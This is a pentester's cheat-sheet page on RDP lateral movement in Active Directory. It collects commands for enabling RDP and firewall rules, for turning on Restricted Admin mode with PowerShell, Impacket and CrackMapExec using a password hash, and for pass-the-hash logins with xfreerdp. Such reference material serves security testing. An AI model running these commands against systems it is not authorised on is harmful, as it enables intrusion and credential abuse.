# RDP

https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/rdp

Remote Desktop Protocol

* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
* [https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3](https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3)

Look for terminal servers in a domain:

```
PS > Get-ADComputer -LDAPFilter "(&(objectClass=computer)(memberOf=CN=Terminal Server License Servers,CN=Builtin,$((Get-ADRootDSE).rootDomainNamingContext)))" | select dNSHostName
```

### Enable RDP

With CMD:

```
:: Enable remote access.

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: allow through firewall.

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

With meterpreter:

```
meterpreter > run getgui -e
```

With PowerShell:

```
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
```

Manually add firewall rule (if necessary):

```
Cmd > netsh advfirewall firewall add rule name="Allow Remote Desktop" dir=in protocol=TCP localport=3389 action=allow
PS > New-NetFirewallRule -DisplayName 'Allow Remote Desktop' -Profile @('Domain', 'Private') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('3389')
```

### Restricted Admin

* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
* [https://github.com/GhostPack/RestrictedAdmin](https://github.com/GhostPack/RestrictedAdmin)
* [https://www.pentestpartners.com/security-blog/abusing-rdps-remote-credential-guard-with-rubeus-ptt/](https://www.pentestpartners.com/security-blog/abusing-rdps-remote-credential-guard-with-rubeus-ptt/)

RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.

Check / enable / disable with PowerShell:

```
PS > Get-ChildItem "HKLM:\System\CurrentControlSet\Control\Lsa" -Recurse
PS > Get-Item "HKLM:\System\CurrentControlSet\Control\Lsa"
PS > New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
PS > Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin"
PS > Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 1
PS > Remove-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin"
```

Check / enable / disable with Impacket:

```
$ reg.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.1 query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -s
$ reg.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.1 add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin -vt REG_DWORD -vd 0
$ reg.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.1 query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin
$ reg.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.1 add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin -vt REG_DWORD -vd 1
$ reg.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.1 delete -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin
```

Enable with CME:

```
$ cme smb 192.168.1.11 -u Administrator -H fc525c9683e8fe067095ba2ddc971889 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

Usage:

```
$ xfreerdp /pth ...
Cmd > mstsc.exe /restrictedAdmin ...
```
